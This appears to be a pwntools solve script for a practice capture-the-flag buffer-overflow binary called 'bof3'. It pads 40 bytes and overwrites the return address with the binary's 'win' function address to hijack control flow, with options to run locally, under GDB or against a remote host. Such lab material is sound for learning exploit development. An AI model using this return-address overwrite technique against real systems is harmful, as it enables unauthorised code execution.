from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = "./bof3"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

io = start()
input()
padding = 40

payload = flat(
    b"A"*padding,
    p64(elf.sym.win + 5)
)

# write('payload', payload)

io.sendafter(b"> ",payload)

io.interactive()